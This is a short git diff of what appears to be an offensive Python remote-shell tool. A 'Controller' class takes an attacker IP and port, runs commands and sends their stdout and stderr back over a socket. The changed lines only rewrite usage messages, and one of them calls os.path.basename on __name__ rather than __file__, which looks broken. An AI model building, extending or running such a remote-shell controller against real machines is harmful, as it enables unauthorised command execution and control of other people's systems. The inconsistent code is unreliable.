@@ -64,7 +64,7 @@ class Controller(object):
                     client_socket.send(cmd.stdout.read())
                     client_socket.send(cmd.stderr.read())
         except Exception:
-            print('\nUsage for help: python3 <file-name.py> -h ')
+            print(f'\nUsage for help: python3 {os.path.basename(__name__)} -h ')
 if __name__ == "__main__":
     main_class = Controller(args.attackerip,args.port)
     banner = Process(target=main_class.show_banner,args=('''
@@ -88,4 +88,5 @@ if __name__ == "__main__":
         try:
             main_class.listen()
         except:
-            pass
+            print(f'\nUsage for help: python3 {os.path.basename(__file__)} -h ')
+            exit()
